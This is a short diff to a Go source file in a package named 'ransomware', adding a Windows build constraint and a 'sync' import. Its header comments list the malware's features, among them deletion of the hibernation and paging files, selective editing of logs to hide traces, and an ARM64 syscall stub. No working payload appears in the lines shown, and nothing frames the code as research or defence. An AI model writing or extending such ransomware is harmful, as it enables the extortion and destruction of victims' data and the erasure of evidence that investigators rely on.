@@ -10,6 +10,8 @@
 //   - Hibernation/paging file deletion
 //   - Selective log: export+filter+replace without corruption
 //   - ARM64 syscall stub (svc #0 in x8)
+//go:build windows
+
 package ransomware
 
 import (
@@ -29,6 +31,7 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
+	"sync"
 	"time"
 )
 
